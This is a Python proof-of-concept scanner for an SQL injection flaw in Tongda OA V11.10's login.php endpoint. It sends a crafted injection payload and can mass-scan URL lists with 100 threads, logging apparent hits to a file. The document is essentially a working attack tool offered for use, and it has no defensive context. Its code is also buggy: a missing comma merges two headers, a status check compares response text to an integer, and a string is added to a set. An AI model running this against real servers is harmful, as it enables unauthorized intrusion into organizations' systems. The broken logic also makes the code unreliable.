import requests,argparse,sys,json,re
from multiprocessing.dummy import Pool
from requests.packages import urllib3
#关闭警告
GREEN = '\033[92m'
RESET = '\033[0m'
urllib3.disable_warnings()
def banner():
    test="""
                  _      
                 | |     
  _   _ _   _  __| |___  
 | | | | | | |/ _` / __| 
 | |_| | |_| | (_| \__ \ 
  \__, |\__, |\__,_|___/ 
   __/ | __/ |           
  |___/ |___/            
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="通达OAV11.10login.phpSQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    url = target + '/ispirit/interface/login.php'
    headers ={
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_12_6)',
        'AppleWebKit/537.36(KHTML,likeGecko)Chrome/69.0.855.2Safari/537.36'
        'Content-Type':'application/x-www-form-urlencoded', 
        'Content-Length':'107',
        }
    data="name=123&pass=123&_SERVER[REMOTE_ADDR]=1','10',(select+@`,'`+or+if(1%3d0,1,(select+~0%2b1))+limit+0,1))--+'"

    try:
        res = requests.post(url=url,verify=False,headers=headers,data=data).text
        if res == 200:
              with open(r'cg.txt','a+') as f1:
                   f1.write(f'{target}\n')
                   print('[+++++++]'+target+'可能存在漏洞')
        else:
             print('[-]'+{target}+'可能不存在漏洞')
    except:
         print(f'[*]{target}'' is server error')

if __name__ == '__main__':
    main()
